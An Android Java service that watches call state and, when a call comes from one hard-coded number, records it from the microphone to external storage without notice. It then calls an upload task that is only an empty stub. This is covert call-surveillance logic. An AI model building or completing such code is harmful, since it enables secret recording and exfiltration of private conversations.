package com.chenls.myphone;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;

public class PhoneService extends Service {
    private static final String TAG = "hh";

    public PhoneService() {
    }

    @Override
    public void onDestroy() {
        Toast.makeText(this, "亲爱的，再见了", Toast.LENGTH_LONG).show();
//        //清空缓存目录下的所有文件
//        File[] files = getCacheDir().listFiles();
//        if(files != null){
//            for(File f : files ){
//                f.delete();
//            }
//        }
//        Log.i("hh", "service destroy");
//        super.onDestroy();
//        super.onDestroy();
    }

    @Override
    public void onCreate() {
        Log.i("hh", "Service");
        Toast.makeText(this, "亲爱的，我来了", Toast.LENGTH_LONG).show();
        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        tm.listen(new TelListener(), PhoneStateListener.LISTEN_CALL_STATE);
        super.onCreate();
    }

    private class TelListener extends PhoneStateListener {

        private MediaRecorder recorder;
        private File audioFile;
        private boolean record;
        private boolean isQQ;

        @Override
        public void onCallStateChanged(int state, String incomingNumber) {

            try {
                switch (state) {
                    case TelephonyManager.CALL_STATE_IDLE: //无任何状态时
                        if (record) {
                            recorder.stop(); //停止刻录
                            recorder.release(); //释放资源
                            record = false;
                            isQQ = false;
                            new Thread(new UploadTask()).start();  //将录音文件上传
                        }
                        break;
                    case TelephonyManager.CALL_STATE_OFFHOOK: //接起电话时
                        Log.i(TAG, "接起电话");
                        if (!isQQ) {
                            Log.i(TAG, "not_isQQ");
                            return;
                        }
                        Log.i(TAG, "isQQ");
                        recorder = new MediaRecorder();
                        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);//从麦克风采集声音
                        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP); //内容输出格式
                        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);//音频编码方式
                        File sd = Environment.getExternalStorageDirectory();
                        String path = sd.getPath() + "/录音";
                        File file = new File(path);
                        if (!file.exists()) {
                            file.mkdir();
                        }
                        SimpleDateFormat df = new SimpleDateFormat("yyyyMMddHHmmss");//设置日期格式
                        Log.i(TAG, "为获取当前系统时间"+df.format(new Date()));
                        audioFile = new File(file, df.format(new Date()) + ".3gp");
                        Log.i(TAG, "start record");
                        Log.i("hh", "保存路径：" + file);
                        recorder.setOutputFile(audioFile.getAbsolutePath());
                        recorder.prepare(); //预期准备
                        recorder.start(); //开始刻录
                        record = true;
                        break;
                    case TelephonyManager.CALL_STATE_RINGING: //电话进来时
                        Log.i(TAG, incomingNumber + " coming");
                        if ("15223371941".equals(incomingNumber)) {
                            isQQ = true;
                            Log.i(TAG, " isQQ = true");
                        }
                        break;

                    default:
                        break;

                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            super.onCallStateChanged(state, incomingNumber);
        }

    }

    private final class UploadTask implements Runnable {

        @Override
        public void run() {
            //上传文件操作
        }

    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
}
